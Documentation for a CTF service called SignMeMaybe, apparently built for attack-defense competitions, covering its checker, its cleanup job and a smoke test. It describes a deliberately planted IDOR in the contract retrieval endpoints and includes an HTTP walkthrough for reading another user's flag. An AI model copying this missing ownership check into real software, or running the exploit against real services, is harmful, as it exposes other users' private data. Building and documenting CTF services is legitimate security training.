# Service documentation

This is the place to keep important documentation details about the service.

SignMeMaybe stores CTF flags as the text content of contracts created by the checker. Every contract receives a public `reference` such as `CNTR-...`; internal numeric IDs are not exposed by the API.

## Contract Reference IDOR

The main branch intentionally exposes an Insecure Direct Object Reference (IDOR) in the contract retrieval endpoints. Authentication is required, but latest contract retrieval does not enforce contract ownership once a caller knows a public contract reference.

*   **Public Metadata:** `GET /api/users/{username}/contracts` returns public contract metadata for a holder username, including contract references.
*   **Latest Version Retrieval:** `GET /api/contracts/{reference}/versions/latest` requires a valid session token, but does not require the authenticated user to own the requested contract.
*   **PDF Retrieval:** `GET /api/contracts/{reference}/versions/latest/pdf` mirrors the same authorization gap before returning a generated PDF.
*   **Non-owner Behavior:** Requests for another user's contract return `200 OK` when the reference exists and the caller has any valid session. Missing references still return `404 Not Found`.

## Flags:

*   **Contract Content:** The checker stores flags in the `content` field of a contract created during `putflag`.
*   **Flag Format:** Placed flags are expected to match `ENO[A-Za-z0-9+/=]{48}`. The checker receives `task.flag` from the CTF framework, logs a maintainer-only debug message if the value does not match, and still stores the provided flag.
*   **Attack Hint:** `putflag` returns the owner username as the attack hint and keeps the owner's credentials plus contract reference in checker state for `getflag`.
*   **Access Rule:** The flag remains retrievable by the owning checker account and is also retrievable by a different authenticated user who resolves the public contract reference.
*   **Failure Messages:** Checker exceptions must not include flag values.

---

## Exploitation Path

The intended exploit uses the checker-provided owner username to discover public contract references, then reads the latest contract version with an attacker-controlled session.

### IDOR Check

Register an attacker account:

```http
POST /api/register HTTP/1.1
Host: localhost:1984
Content-Type: application/json

{
  "username": "attacker_user",
  "password": "attacker_password"
}
```

The service returns a session token:

```json
{
  "userId": 2,
  "username": "attacker_user",
  "token": "<SESSION_TOKEN>"
}
```

Use the target username from the attack hint to fetch public contract metadata:

```http
GET /api/users/arden_ledger_12345/contracts HTTP/1.1
Host: localhost:1984
Accept: application/json
```

The public metadata response includes contract references for that holder:

```json
{
  "username": "arden_ledger_12345",
  "contracts": [
    {
      "reference": "CNTR-0123456789abcdef01234567",
      "title": "Signing Package example",
      "latestVersion": {
        "versionNumber": 1,
        "approvalState": "draft"
      }
    }
  ]
}
```

Use the attacker token to fetch the latest version by reference:

```http
GET /api/contracts/CNTR-0123456789abcdef01234567/versions/latest HTTP/1.1
Host: localhost:1984
X-Session-Token: <SESSION_TOKEN>
Accept: application/json
```

On `main`, this returns `200 OK` even when the contract belongs to another user:

```json
{
  "reference": "CNTR-0123456789abcdef01234567",
  "ownerUsername": "arden_ledger_12345",
  "requestedByUsername": "attacker_user",
  "content": "<FLAG>"
}
```

The generated PDF endpoint follows the same IDOR:

```http
GET /api/contracts/CNTR-0123456789abcdef01234567/versions/latest/pdf HTTP/1.1
Host: localhost:1984
X-Session-Token: <SESSION_TOKEN>
```

The owner can still fetch the contract normally with their own token:

```http
GET /api/contracts/CNTR-0123456789abcdef01234567/versions/latest HTTP/1.1
Host: localhost:1984
X-Session-Token: <OWNER_SESSION_TOKEN>
Accept: application/json
```

## Checker Coverage

*   **`putflag/getflag`:** Stores the supplied flag in a contract and verifies it through the owner account using the stored `CNTR-...` reference.
*   **`putnoise/getnoise`:** Creates benign state and verifies login, `/api/me`, own listing, public holder metadata, latest JSON retrieval, and generated PDF retrieval.
*   **`havoc`:** Runs stateless checks only: health, rejected login for an unknown account, rejected unauthenticated API access, invalid registration input, unknown public holder lookup, and malformed public holder lookup.
*   **`exploit`:** Registers an attacker, queries `GET /api/users/{username}/contracts`, uses the returned `reference`, and fetches latest JSON/PDF through the intended IDOR path.

## Runtime Cleanup

The service compose stack includes a separate `signmemaybe-cleanup` container. It runs OS cron once per minute and invokes:

```bash
dotnet /app/SignMeMaybe.dll --cleanup-once
```

Cleanup uses the same runtime environment as the service:

*   `SIGNMEMAYBE_DB_PATH`, default `/data/signmemaybe.sqlite3`
*   `SIGNMEMAYBE_PDF_ROOT`, default `/data/pdfs`
*   `SIGNMEMAYBE_EXPORT_ROOT`, default `/data/exports`
*   `SIGNMEMAYBE_CLEANUP_RETENTION_SECONDS`, default `720`

Each cleanup pass removes generated PDF/export files under the configured runtime roots when they are older than the retention window. It also deletes old sessions, old contracts and cascaded dependent rows, old exports, and old users that have no remaining live sessions or contracts. The SQLite file itself may remain.

## Local Smoke Test

Start the service with temporary storage:

```bash
SIGNMEMAYBE_DB_PATH=/tmp/signmemaybe-smoke.sqlite3 SIGNMEMAYBE_PDF_ROOT=/tmp/signmemaybe-smoke-pdfs SIGNMEMAYBE_EXPORT_ROOT=/tmp/signmemaybe-smoke-exports dotnet run --project service/src/SignMeMaybe.csproj --urls http://127.0.0.1:51989
```

Register a user, create a contract, and confirm the creation response contains a `reference` starting with `CNTR-`:

```bash
curl -sS -X POST http://127.0.0.1:51989/api/register -H 'Content-Type: application/json' -d '{"username":"smoke_user","password":"password123"}'
curl -sS -X POST http://127.0.0.1:51989/api/contracts -H 'Content-Type: application/json' -H 'X-Session-Token: <TOKEN>' -d '{"title":"Smoke","content":"ENOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}'
```

Fetch the latest JSON and PDF with the same token:

```bash
curl -sS http://127.0.0.1:51989/api/contracts/<REFERENCE>/versions/latest -H 'X-Session-Token: <TOKEN>'
curl -sS http://127.0.0.1:51989/api/contracts/<REFERENCE>/versions/latest/pdf -H 'X-Session-Token: <TOKEN>' -o /tmp/signmemaybe-smoke.pdf
```

Run one cleanup pass against the temporary storage:

```bash
SIGNMEMAYBE_DB_PATH=/tmp/signmemaybe-smoke.sqlite3 SIGNMEMAYBE_PDF_ROOT=/tmp/signmemaybe-smoke-pdfs SIGNMEMAYBE_EXPORT_ROOT=/tmp/signmemaybe-smoke-exports SIGNMEMAYBE_CLEANUP_RETENTION_SECONDS=1 dotnet run --project service/src/SignMeMaybe.csproj -- --cleanup-once
```
